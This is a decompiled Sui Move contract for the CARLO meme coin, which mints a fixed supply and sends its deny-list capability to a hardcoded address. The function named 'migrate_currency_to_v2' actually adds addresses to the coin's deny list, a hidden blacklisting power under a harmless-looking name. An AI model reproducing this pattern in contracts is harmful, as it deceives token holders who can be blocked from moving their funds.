module 0xb204a860edb114f97771bcc6f7614d99b7c27300e997ed270781e21d6868c960::carlo {
    struct CARLO has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<CARLO>, arg1: 0x2::coin::Coin<CARLO>) {
        0x2::coin::burn<CARLO>(arg0, arg1);
    }

    fun init(arg0: CARLO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CARLO>(arg0, 9, b"CARLO", b"Carlo", b"Carlo is bringing a whole new level of entertainment with high quality 2D and 3D content to meme projects on Sui Chain.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/vkZbBhf/cl.webp")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CARLO>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CARLO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CARLO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CARLO>>(v1, @0xd07cc3aaaa6ba121569808854a235241f7e7a2caf8a2571004c56676dce7ebc1);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CARLO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CARLO>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<CARLO>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<CARLO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

